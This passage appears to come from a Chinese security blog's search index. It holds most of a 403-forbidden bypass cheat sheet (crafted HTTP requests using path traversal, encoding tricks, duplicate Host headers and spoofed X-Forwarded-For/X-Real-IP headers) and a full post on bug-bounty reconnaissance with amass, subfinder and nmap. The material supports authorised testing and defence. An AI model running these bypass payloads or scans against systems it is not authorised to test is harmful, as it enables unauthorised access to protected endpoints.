application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据2：</p><pre class="line-numbers language-html"><code class="language-html">POST /v2/userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、关键值作为通配符"><a href="#5、关键值作为通配符" class="headerlink" title="#5、关键值作为通配符"></a><strong><u>#5、关键值作为通配符</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据1:</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据2:</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6、添加-URL-编码"><a href="#6、添加-URL-编码" class="headerlink" title="#6、添加 URL 编码"></a><strong><u>#6、添加 URL 编码</u></strong></h2><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了对关键参数值添加URL编码，也可以尝试对路径添加URI编码，通过使用Intruder来批量fuzz可用的url编码。</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo..%ff HTTP/1.1POST /userinfo%2e%2e%2f HTTP/1.1POST /userinfo%3f HTTP/1.1POST /userinfo%23 HTTP/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7、路径穿越"><a href="#7、路径穿越" class="headerlink" title="#7、路径穿越"></a><strong><u>#7、路径穿越</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">POST //userinfo HTTP/1.1POST /../userinfo HTTP/1.1POST /;../userinfo HTTP/1.1POST /..;/userinfo HTTP/1.1POST /userinfo/ HTTP/1.1POST /%2f/userinfo/ HTTP/1.1POST /userinfo../ HTTP/1.1POST /..%3B/userinfo HTTP/1.1POST /..%2e/userinfo HTTP/1.1POST /.//userinfo HTTP/1.1POST /./userinfo HTTP/1.1POST /#/userinfo HTTP/1.1POST /#/../userinfo HTTP/1.1...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8、参数污染"><a href="#8、参数污染" class="headerlink" title="#8、参数污染"></a><strong><u>#8、参数污染</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=2&amp;id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="9、修改协议头"><a href="#9、修改协议头" class="headerlink" title="#9、修改协议头"></a><strong><u>#9、修改协议头</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">https://host.com/debug/   ----  403http://host.com/debug/    ----  200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="10、添加Host头"><a href="#10、添加Host头" class="headerlink" title="#10、添加Host头"></a><u><strong><em>#10、添加Host头</em></strong></u></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comHost: localhostContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11、修改Host头为host头"><a href="#11、修改Host头为host头" class="headerlink" title="#11、修改Host头为host头"></a><strong><u>#11、修改Host头为host头</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comHost: localhostContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1host: api.host.comHost: localhostContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="12、删除Host头中的空格"><a href="#12、删除Host头中的空格" class="headerlink" title="#12、删除Host头中的空格"></a><strong><u>#12、删除Host头中的空格</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host:api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="13、在Host头中添加空格"><a href="#13、在Host头中添加空格" class="headerlink" title="#13、在Host头中添加空格"></a><strong><u>#13、在Host头中添加空格</u></strong></h2><p>原数据:</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host:  api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="14、修改后缀"><a href="#14、修改后缀" class="headerlink" title="#14、修改后缀"></a><strong><u>#14、修改后缀</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">POST /userinfo.json HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedid=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用Intruder模块批量fuzz后缀名</p><h2 id="15、添加X-Original-URL头"><a href="#15、添加X-Original-URL头" class="headerlink" title="#15、添加X-Original-URL头"></a><strong><u>#15、添加X-Original-URL头</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">GET / HTTP/1.1Host: api.host.comX-Original-URL: /debug/Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="16、添加以下头来绕过403："><a href="#16、添加以下头来绕过403：" class="headerlink" title="#16、添加以下头来绕过403："></a><strong><u>#16、添加以下头来绕过403：</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">CF-Connecting-IP: 127.0.0.1Content-type: 0Fastly-Client-IP: 127.0.0.1Forwarded: 127.0.0.1Forwarded: for=127.0.0.1Forwarded-For: 127.0.0.1Forwarded-For-Ip: 127.0.0.1True-Client-IP: 127.0.0.1X-Client-IP: 127.0.0.1X-Cluster-Client-IP: 127.0.0.1X-Custom-IP-Authorization: 127.0.0.1X-Forwarded: 127.0.0.1X-Forwarded-By: 127.0.0.1X-Forwarded-For:X-Forwarded-For: 127.0.0.1X_Forwarded_For: 127.0.0.1X-Forwarded-For: 127.0.0.1\rX-Forwarded-For-Original: 127.0.0.1X-Forwarded-Host: 127.0.0.1X-Forwarder-For: 127.0.0.1X-Forward-For: 127.0.0.1X-Host: 127.0.0.1X-Originating-IP: 127.0.0.1X-ProxyUser-Ip: 127.0.0.1X-Real-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Remote-IP: 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="17、添加X-Rewrite-URL头"><a href="#17、添加X-Rewrite-URL头" class="headerlink" title="#17、添加X-Rewrite-URL头"></a><strong><u>#17、添加X-Rewrite-URL头</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">GET / HTTP/1.1Host: api.host.comX-Rewrite-URL: /debug/Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="18、修改User-Agent头"><a href="#18、修改User-Agent头" class="headerlink" title="#18、修改User-Agent头"></a><strong><u>#18、修改User-Agent头</u></strong></h2><p>通过Intruder来批量fuzz可用的User-Agent头</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comUser-Agent: FUZZContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="19、通过反向代理的方式来尝试绕过"><a href="#19、通过反向代理的方式来尝试绕过" class="headerlink" title="#19、通过反向代理的方式来尝试绕过"></a><strong><u>#19、通过反向代理的方式来尝试绕过</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">GET http://api.host.com/debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="20、通过大小写转换的方式绕过"><a href="#20、通过大小写转换的方式绕过" class="headerlink" title="#20、通过大小写转换的方式绕过"></a><strong><u>#20、通过大小写转换的方式绕过</u></strong></h2><p>原数据：</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据:</p><pre class="line-numbers language-html"><code class="language-html">GET /DEBUG/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="21、添加200-OK绕过403"><a href="#21、添加200-OK绕过403" class="headerlink" title="#21、添加200-OK绕过403"></a><u><strong><em>#21、添加200-OK绕过403</em></strong></u></h2><p>如果有Apache作为代理，我们可以通过在接口中添加200-OK来绕过403</p><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">GET /200-OK/..//debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第二种方式是通过200-OK+%2e%2e的组合来绕过403</p><pre class="line-numbers language-html"><code class="language-html">GET /200-OK/%2e%2e/debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第三种和第二种相似，只是我们在200-OK后面添加个空格</p><pre class="line-numbers language-html"><code class="language-html">GET /200-OK%20/%2e%2e/debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第四种通过；来绕过限制</p><pre class="line-numbers language-html"><code class="language-html">GET /200-OK/;debug/ HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>除了在前面添加，我们也可以在后面添加</p><pre class="line-numbers language-html"><code class="language-html">GET /debug;/../200-OK HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="22、在接口后面添加？"><a href="#22、在接口后面添加？" class="headerlink" title="#22、在接口后面添加？"></a><strong><u>#22、在接口后面添加？</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">GET /debug? HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="23、修改请求方法为小写"><a href="#23、修改请求方法为小写" class="headerlink" title="#23、修改请求方法为小写"></a><strong><u>#23、修改请求方法为小写</u></strong></h2><p>我们通过将请求方法修改为小写的方式来绕过，比如GET -&gt; GeT、POST -&gt; Post</p><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">GeT /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="24、请求数据第一行添加-r-n"><a href="#24、请求数据第一行添加-r-n" class="headerlink" title="#24、请求数据第一行添加\r\n"></a><u><strong>#24、请求数据第一行添加\r\n</strong></u></h2><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">\r\nGET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="25、使用Content-type-0"><a href="#25、使用Content-type-0" class="headerlink" title="#25、使用Content-type: 0"></a><u>#25、使用Content-type: 0</u></h2><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-type: 0Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="26、hop-by-hop"><a href="#26、hop-by-hop" class="headerlink" title="#26、hop-by-hop"></a><strong><u>#26、hop-by-hop</u></strong></h2><p>原数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改后的数据</p><pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1Host: api.host.comContent-Type: application/x-www-form-urlencodedConnection: Close, X-Real-Ip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="27、x-user-id"><a href="#27、x-user-id" class="headerlink" title="#27、x-user-id"></a><strong><u>#27、x-user-id</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">GET /api/users/1337 => 401GET /api/users/ x-user-id: 1337 =>> 200 OkPOST /api/users/ x-user-id: 1337 =>> 200 Ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><strong><u>参考资料</u></strong></h2><p><a href="https://github.com/sting8k/BurpSuite_403Bypasser">https://github.com/sting8k/BurpSuite_403Bypasser</a></p><p><a href="https://github.com/yunemse48/403bypasser">https://github.com/yunemse48/403bypasser</a></p><p><a href="https://docs.google.com/presentation/d/1ek6DzXKBQd6xUiVNGRT33pMACs8M13CSoYCkgepDKZk/edit#slide=id.gb344e2d586_0_0">https://docs.google.com/presentation/d/1ek6DzXKBQd6xUiVNGRT33pMACs8M13CSoYCkgepDKZk/edit#slide=id.gb344e2d586_0_0</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的信息收集论</title>
      <link href="/2021/01/22/wo-de-xin-xi-shou-ji-lun/"/>
      <url>/2021/01/22/wo-de-xin-xi-shou-ji-lun/</url>
      
        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>众所周知，做漏洞挖掘前期的信息收集工作起着非常大的作用，可以说信息收集的工作决定了你在做漏洞挖掘时的效率，本篇文章旨在记录下我的信息收集准备工作。</p><a id="more"></a><h1 id="二、水平域的收集"><a href="#二、水平域的收集" class="headerlink" title="二、水平域的收集"></a>二、水平域的收集</h1><p>当你挖一家厂商时，可以先看看厂商在hackerone是否有项目，有的话可以去里面收集范围：<br><img src="https://img-blog.csdnimg.cn/20210122173407447.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>如果希望在hackerone给的赏金范围上继续进行资产的收集，我们可以将目光转到 <a href="https://crunchbase.com/">https://crunchbase.com</a> 的网站，进一步扩大我们的业务范围。</p><p>从这里我们可以看到很多收购行为，我们需要对这些收购行为进行谷歌搜索并分析，以确定这个行为是否仍属于母公司，而并没有拆分和出售给其他公司:<br><img src="https://img-blog.csdnimg.cn/20210122174255277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>当然我们也可以通过反whois查询来查询注册邮箱或者联系人下的资产信息，如下图，我们首先来看看yahoo的whois：</p><pre><code>whois yahoo.com</code></pre><p><img src="https://img-blog.csdnimg.cn/20210122174512416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>通过whois查看到注册人邮箱为<a href="mailto:&#x64;&#111;&#109;&#97;&#105;&#110;&#x2d;&#x61;&#100;&#109;&#x69;&#110;&#x40;&#111;&#x61;&#116;&#104;&#x2e;&#99;&#111;&#x6d;">&#x64;&#111;&#109;&#97;&#105;&#110;&#x2d;&#x61;&#100;&#109;&#x69;&#110;&#x40;&#111;&#x61;&#116;&#104;&#x2e;&#99;&#111;&#x6d;</a>，我们就可以通过此电子邮箱来查找与yahoo.com 具有相同注册人电子邮件的所有其他站点，你可以通过 <a href="https://tools.whoisxmlapi.com/reverse-whois-search">https://tools.whoisxmlapi.com/reverse-whois-search</a> 来进行查询，也可以通过 <a href="https://viewdns.info/">https://viewdns.info</a> 来进行反whois查询，渗透测试神器amass也提供了相应的查询功能，查询的命令为：</p><pre><code>amass intel -whois -d yahoo-inc.com</code></pre><p>有时候我们会遇到域名有屏蔽关键信息的现象，导致我们没办法看到真正的注册邮箱，这个时候我们可以通过查询域名的历史whois来得到关键信息，这时我们可以使用 <a href="https://www.whoxy.com/">https://www.whoxy.com/</a> 来查询历史whois。</p><h1 id="三、ASN枚举"><a href="#三、ASN枚举" class="headerlink" title="三、ASN枚举"></a>三、ASN枚举</h1><p>通过(bgp.he.net)来查询as号：</p><p>我们可以利用amass来查询组织名称中带有sony的asn号，使用的命令是：</p><pre><code>amass intel -org sony</code></pre><p>通过<a href="https://github.com/yassineaboukir/Asnlookup">Asnlookup</a>来获取特定组织的资产ip段。</p><h1 id="四、垂直域的收集"><a href="#四、垂直域的收集" class="headerlink" title="四、垂直域的收集"></a>四、垂直域的收集</h1><p>子域名枚举是信息收集工作中最为重要的一环，子域名收集得越全，你挖到漏洞的概率也会相应地增加，这里就简单讲下我平时收集子域名的主要几种方式吧。<br>1、通过burpsuite收集子域名</p><p>第一步，确定收集的范围；<br>第二步，对所有的链接进行爬行，爬虫的工具很多，这里不多加述说，这里我使用的是burpsuite：<br><img src="https://img-blog.csdnimg.cn/20210122181243476.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3ODI2Mjg5MjU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>从以上两步操作后，我们可以对获取的子域名进行第二次爬虫，当然，逆向结果尽可能多点，可以多爬几次。<br>第三步，导出子域名<br>“Engagement Tools” -&gt; “Analyze target” -&gt; 保存为html文件 -&gt; 从html文件中复制出我们的host。<br>我们还可以从爬行的js文件中获取子域名，具体操作步骤如下：</p><p>将所有的链接复制到js.txt中，筛选处js文件：</p><pre><code>cat js.txt | grep ‘\.js’</code></pre><p>利用<a href="https://github.com/nsonaniya2010/SubDomainizer">SubDomainizer</a>来获取js文件中的子域名。</p><p>2、从api接口获取子域名</p><p>互联网上有很多能够查询域信息的网站，如crt.sh，DNSDB，virustotal，sslmate等网站，我们可以利用这些网站来收集更多的子域名，我经常使用的是以下两款个人感觉好用的工具：</p><ul><li>利用amass查找子域名：</li></ul><pre><code>amass enum --passive -d baidu.com</code></pre><ul><li>利用subfinder来查询子域名：<pre><code>echo baidu.com | subfinder</code></pre></li></ul><p>3、基于字典的子域名枚举</p><p>基于字典的子域名枚举的工具有很多，以下是我经常使用的工具:</p><ul><li>使用amass爆破子域名：<pre><code>amass enum -brute -d baidu.com -w ~/Desktop/tool/fuzz/dns/sub_small.txt</code></pre></li><li>使用shuffledns爆破子域名：<pre><code>shuffledns -d baidu.com -r ~/tools/massdns/lists/resolvers.txt -w ~/Desktop/tool/fuzz/dns/sub_small.txt</code></pre><h1 id="五、端口扫描"><a href="#五、端口扫描" class="headerlink" title="五、端口扫描"></a>五、端口扫描</h1>1、利用nmap对前面收集的子域名进行全端口的扫描：</li></ul><pre><code>nmap -sV -sS -iL sub.txt --open -p- -T4 -oX result.xml</code></pre><p>2、解析nmap扫描结果，对于最终的扫描结果，我们需要解析获取相应的数据。</p><p>3、对于开启web端口的我们需要获取标题，状态码等信息，我们可以使用<a href="https://github.com/projectdiscovery/httpx">httpx</a>来达到这个目的。</p><h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><p>以上便是我对企业资产进行收集的全过程，有不足的部分还要请各位师傅请教。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
